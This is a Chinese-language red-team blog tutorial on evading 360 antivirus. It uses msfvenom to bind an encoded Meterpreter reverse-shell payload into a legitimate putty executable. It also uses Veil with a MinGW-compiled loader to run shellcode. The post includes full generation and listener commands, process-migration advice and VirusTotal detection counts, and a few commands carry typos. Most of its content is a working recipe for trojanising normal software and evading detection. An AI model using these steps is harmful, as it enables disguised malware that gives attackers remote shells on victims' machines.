## 0x00：前言

随着近两年hvv和红蓝对抗以及国家对于网络安全的重视，国内防护水平都蹭蹭上了一个台阶，不管是内部人员的技术水平提高还是防护设备的层层部署，均给了红队人员想要进一步行动设置了障碍。

拿上一篇文章举例，通过weblogic的cve-2019-2725获取了一个，想要进一步把shell迁移到msf或者CS进行横向移动，那么此时普通的马绝对会被某60秒杀的，毕竟十来年的规则库积累，可能连上传都上传不了。

![](https://image.3001.net/images/20210115/1610697782_60014c36cf8356b6f40be.jpg!small)

所以此时免杀的重要性不言而喻。且免杀也是一门非常深的学问，擅长逆向、精通底层的小伙伴入手免杀简直如虎添翼，可以自己写加载器去加载shellcode或者直接进行加壳混淆等等。当然薄弱也没关系，
**下面来介绍一些msf、evil等等渗透框架的免杀技巧，姿势学会了也包过国内常见杀软。**

![](https://image.3001.net/images/20210115/1610697809_60014c51eb5cf3ae9699d.jpg!small)

##  **0x01：环境准备**

本次采用的杀软是360安全卫士全家桶（12.0.0.2001/2002)

win7虚拟机，联网状态，支持静态动态查杀、木马检测、行为检测

kali攻击机（2020年03版本)，msf攻击载荷使用windows/meterpreter/reverse_tcp_rc4

国际杀软查杀检测（简称VT)：https://www.virustotal.com/gui/

## 0x02： **msf自捆绑配合编码免杀**

使用msfvenom生成木马的时候使用-x捆绑一个正常的软件，类似于生成图片马，将恶意攻击payload镶进软件内。然后再对木马进行编码，命令如下。

    
    
    msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=172.16.143.135 LPORT=4444 -e x86/shikata_ga_nai -x puttyel.exe -i 15 - f exe -o fake_puttyel.exe

实验结果：能过360纯静态查杀，但时隔1分钟左右会被行为检测、动态检测查杀。所以上线以后及时做进程迁移。

首先msfvenom简单介绍一下，属于metasploit的生成payload模块。自15年起代替了msfpayload和msfencode，功能十分强大，支持多个参数进行编码。

msfvenom --list
encoders：查看msfvenom自带的编码器，可以看到x86/shikata_ga_nai编码器是评级为x86里面唯一excellent的，所以也是编码中使用最多的。

![](https://image.3001.net/images/20210115/1610697842_60014c7281a444cc8665c.jpg!small)介绍一下相关参数。

    
    
    -p, –payload < payload> 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的 -l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all -n, –nopsled < length> 为payload预先指定一个NOP滑动长度
     -f, –format < format> 指定输出格式 (使用 –help-formats 来获取msf支持的输出格式列表)
     -e, –encoder [encoder] 指定需要使用的encoder(编码器),指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出 payload -a, –arch < architecture> 指定payload的目标架构，例如x86 | x64 | x86_64
    –platform < platform> 指定payload的目标平台
     -s, –space < length> 设定有效攻击荷载的最大长度，就是文件大小
     -b, –bad-chars < list> 设定规避字符集，指定需要过滤的坏字符例如:不使用 '\x0f'、'\x00'; -i, –iterations < count> 指定payload的编码次数
     -c, –add-code < path> 指定一个附加的win32 shellcode文件
     -x, –template < path> 指定一个自定义的可执行文件作为模板,并将payload嵌入其中
     -k, –keep 保护模板程序的动作，注入的payload作为一个新的进程运行 –payload-options 列举payload的标准选项
     -o, –out < path> 指定创建好的payload的存放位置
     -v, –var-name < name> 指定一个自定义的变量，以确定输出格式

执行生成木马语句。

![](https://image.3001.net/images/20210115/1610697869_60014c8db35091fc45b48.jpg!small)msf建立监听。

    
    
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp_rc4
    set LHSOT 172.16.143.135set LPORT 4444
    run

生成的木马文件。

![](https://image.3001.net/images/20210115/1610697891_60014ca3f029fca814a96.jpg!small)执行以后，360无报警，msf成功上线。

![](https://image.3001.net/images/20210115/1610697909_60014cb5ceff0ce59fe49.jpg!small)![](https://image.3001.net/images/20210115/1610697925_60014cc5e97470a1c3ec3.jpg!small)获得shell后，确定不是个假sessions，即迁移shell到系统进程中，迁移成功后哪怕木马被360行为检测查杀也不会影响。

![](https://image.3001.net/images/20210115/1610697949_60014cdd9865c0ba1f944.jpg!small)像这种在自己靶机内测试，点击第一次可以，断开shell后再次点击就会被秒查杀，因为被本地规则库收录，此时换一个正常的exe文件进行重新捆绑即可，问题不大。

接下来看一下VT查杀率（36/71），效果不算好，但能过360（阿里巴巴也出杀软了，不过测试发现表现不大行，果然这种安全行业还是很拼积累和底蕴的）

![](https://image.3001.net/images/20210115/1610697968_60014cf0e73d5acd63934.jpg!small)
**0** x **03：使用veil+mingw-w64**

veil是一个专门拿来做免杀的渗透框架

详细介绍可以去看一下官方手测

安装方法，直接pull其docker最方便，直接安装可能会出现各种玄学问题

    
    
    镜像地址：https://hub.docker.com/r/mattiasohlsson/veil/
    拉取veil镜像：docker pull mattiasohlsson/veil
    执行evil:docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil
    上述把本机的/tmp/evil-output目录映射到docker里面，这样veil生成的马就在本机可以直接操作

运行成功如下，veil有两个免杀模块，Evasion和Ordnance，我们多用Evasion来做文件免杀。

use 1即可

切换到如下的Evasion模块下，执行list 可以看到41个stager

![](https://image.3001.net/images/20210115/1610697991_60014d0754b108be6d5bc.jpg!small)对应各个工具、语言木马模块

![](https://image.3001.net/images/20210115/1610698023_60014d278bb858dbc63c4.jpg!small)这里veil可以直接生成exe，但会被查杀，这里我们采用外部加载器去加载shellcode,也就是用veil生成shellcode然后使用mibgw-264去加载（windows下的gcc)。

首先veil生成shellcode，命令如下

    
    
    use 1（选择Evasion模块)
     use 7 (选择payload)
     set LHOST 172.16.143.135
     set LPORT 4444
     gengrate

给你的shellcode生成一个名字，其实这个也就是对应着msf配合使用的。

![](https://image.3001.net/images/20210115/1610698043_60014d3b63f5b2a187c44.jpg!small)成功生成，位置在source下的msf22.c文件。

![](https://image.3001.net/images/20210115/1610698396_60014e9ca7de2152450ee.jpg!small)安装好mibgw-264进行编译即可，生成msf66.exe。

百度找到mibgw-264这个安装包，然后在其bin目录下找到gcc.exe即可使用。

![](https://image.3001.net/images/20210115/1610698182_60014dc630c11da0a0074.jpg!small)生成的qwe.exe就是我们的木马文件

![](https://image.3001.net/images/20210115/1610698161_60014db1efad3168faefb.jpg!small)双击执行，msf可成功上线，然后进行迁移进程即可。

![](https://image.3001.net/images/20210115/1610698137_60014d998a55d16da9dcf.jpg!small)附上VT查杀率
11/71，还算不错

![](https://image.3001.net/images/20210115/1610698123_60014d8b6f8627b86f83a.jpg!small)

  

